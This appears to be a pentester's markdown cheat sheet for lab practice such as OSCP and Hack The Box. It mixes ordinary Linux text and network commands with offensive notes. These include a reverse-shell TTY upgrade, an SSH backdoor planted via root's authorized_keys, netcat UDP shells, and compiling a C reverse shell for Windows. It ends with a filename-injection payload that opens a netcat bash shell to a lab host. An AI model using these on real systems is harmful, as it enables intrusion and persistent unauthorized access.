## Spawn an auto-completion and surviving CTRL+C Shell
#### To get a reverse bash auto-completion (Linux):
Note : On the kali box, for now, the zsh terminal is bugging when using the following commands. Use a bash terminal instead to do this.
 - spawn a tty like one with python
	 - python -c 'import pty; pty.spawn("/bin/bash")'
	 - script -q /dev/null
 -  CTRL+Z
 -  stty raw -echo
 -  tap enter
 -  fg
 -  export TERM=xterm
 -  stty -a
	 -  stty rows 34 cols 136

	
## Text Searching and Manipulation
### GREP
```bash
# Look for the word "toto" inside the folder
grep toto -r . 	
# Look for the word "toto" inside a file
grep toto <filename>
```
### SED
```bash
# Will replace the word hard by harder
# s/regexp/replacement/
# -i
echo "I need to try hard" | sed 's/hard/harder/'
```
### CUT
```bash
# This command will return the second field separate by a comma on a designated string 
cut -d ":" -f 1 /etc/passwd
```
### AWK
```bash
# This will return "hello friend"
echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
```
### HEAD
```bash
# Will display the first 10 lines of the file
head /etc/passwd
```
### WC
```bash
# Will display the number of lines from the given file
wc -l /etc/passwd	
```
### SORT
```bash
# Will display unique value
sort -u
```

## Comparing file
### COMM
```bash
# With the COMM command, they are 3 columns
# Column one contains lines unique to FILE1
# Column two contains lines unique to FILE2
# Column three contains lines common to both files.
comm ip1.txt ip2.txt
192.168.20.1
192.168.20.2
192.168.20.3
192.168.20.5
	192.168.20.6
		192.168.20.7
	192.168.20.8
```

### DIFF
```bash
diff -c ip1.txt ip2.txt
*** ip1.txt	2021-07-15 11:17:51.843415163 +0200
--- ip2.txt	2021-07-15 11:18:54.907551864 +0200
***************
*** 1,5 ****
! 192.168.20.1
! 192.168.20.2
! 192.168.20.3
! 192.168.20.5
  192.168.20.7
--- 1,3 ----
! 192.168.20.6
  192.168.20.7
+ 192.168.20.8
```

### VIMDIFF (GUI inside a terminal)
```bash
# Need the vim package to be installed
vimdiff ip1.txt ip2.txt
```

## File and monitoring command
### TAIL
```bash
sudo tail -f /var/log/apache2/access.log
```
### WATCH
```bash
# Check every 5 seconds the users logged in
watch -n 5 w
```

## SS Command
 - https://www.linux.com/topic/networking/introduction-ss-command/

```bash
# all connections
ss -a 
# All TCP connections
ss -at
# All UDP connection
ss -au
# look like a netstat -antp
ss -tulpn
# List of listening ports
ss -lnpt
 ```
 
## Convert Windows text format to Unix text format
```bash
# Convert text files to DOS/MAC and Unix format
dos2unix <file> -n <output_file>
unix2dos <file> -n <output_file>
```

## Spawning a TTY shell
- https://netsec.ws/?p=337

## When dealing with github repositories
- git log
- git show

## Port Knocking
- https://www.it-connect.fr/chapitres/configuration-du-port-knocking-ssh/
- https://wiki.archlinux.org/index.php/Port_knocking

```bash
# install knockd
apt install knockd
# Use the following command to open / close a firewall port. By simply sending 3 Syn request on 3 different port
knock 192.168.19.130 -v 2005 1905 3005
```

## Create a backdoor using SSH
```bash
ssh-keygen
# Push the private RSA key inside the "authorized_keys" of the root user
ssh -i <rsa_key> root@10.10.10.10
```

## Using netcat through UDP
```bash
# Using netcat to get a shell through UDP
nc -u -lvnp <port>
nc -u -nv <ip> <port>
```

## Convert a windows UTF16 to Linux UTF-8
```bash
cat <filename> | iconv -f UTF-16LE -t UTF-8 
cat <filename> | iconv -f UTF-16LE -t UTF-8 | xxd 
```

## MongoDB (Basics commands)
Basics commands:
- https://dzone.com/articles/top-10-most-common-commands-for-beginners

![[MISC-Linux_1.png]]

To connect:
- https://docs.mongodb.com/guides/server/drivers/

Show databases:
- show dbs

Select a database:
- use <databasename>

Show tables / collections
- show collections;
	db.getCollectionNames();

Display table / collection records
- db.<collectionName>.find();

## Get Terminator preferences on XFCE (Unlimited scrolling)
- Shift + F10
- Profiles > Scrolling > Infinite Scrollback

## Grep : To get the surrounding lines
```bash
# -A : Number of after lines
# -B : Number of before lines
# -C : Number of lines before and after
grep -B 3 -A 2 foo README.txt
```

## The TAR command
The TAR command keep the rights when the files are extracted
For example, if a file was a SUID it will keep its attributes and can be used to execute malicious code as the root user
	
## Compile code for windows under Kali linux
```bash
# Install the dependancies 
sudo apt install mingw-w64
	
┌──(kali㉿kali)-[~/Partage/OSCP/Recon_Scripts]
└─$ whereis x86_64-w64-mingw32-gcc
x86_64-w64-mingw32-gcc: /usr/bin/x86_64-w64-mingw32-gcc
                                                                                                      
┌──(kali㉿kali)-[~/Partage/OSCP/Recon_Scripts]
└─$ whereis i686-w64-mingw32-gcc  
i686-w64-mingw32-gcc: /usr/bin/i686-w64-mingw32-gcc
	
# Compiling a C code for windows platform (Using the following code : https://github.com/dev-frog/C-Reverse-Shell/blob/master/reverse.c)
x86_64-w64-mingw32-gcc reverse.c -o reverse.exe -lws2_32
``` 

## Get code execution by poisoning the filename (HTB - Networked)
```bash
# Be carefull, this kind of attack does not like "/" inside the payload
;nc -c bash 10.10.14.10 9001;
# Create a file to execute malicious bash command 
touch -- ';nc -c bash 10.10.14.10 9001;'
```	
